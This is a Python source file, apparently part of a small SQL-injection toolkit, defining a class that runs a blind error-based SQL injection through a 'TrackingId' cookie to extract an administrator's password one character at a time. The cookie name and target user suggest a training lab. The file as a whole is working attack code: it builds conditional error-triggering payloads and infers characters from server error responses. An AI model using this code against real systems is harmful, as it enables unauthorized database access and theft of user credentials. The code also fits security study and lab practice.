from .main import BaseSQLi
from .dbConfig import DB_CONFIG
import requests
import string

class BlindErrorBased(BaseSQLi):
    found_password = ""
    def __init__(self, url, cookie, targetTable, db_type="oracle"):
        super().__init__(url, cookie, targetTable, db_type)
        self.found_password = "" 

    def extract(self, column, username='administrator'):
        for position in range(1, 30):
            for char in string.ascii_lowercase + string.digits:
                payload = f"{self.cookie['TrackingId']}'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN {DB_CONFIG[self.db_type]['error_trigger']} ELSE '' END{DB_CONFIG[self.db_type]['from_dual']})||'"
                cookies = {"TrackingId": payload, "session": self.cookie["session"]}
                response = requests.get(self.url, cookies=cookies)
                if "Internal Server Error" in response.text:
                    self.found_password += char
                    break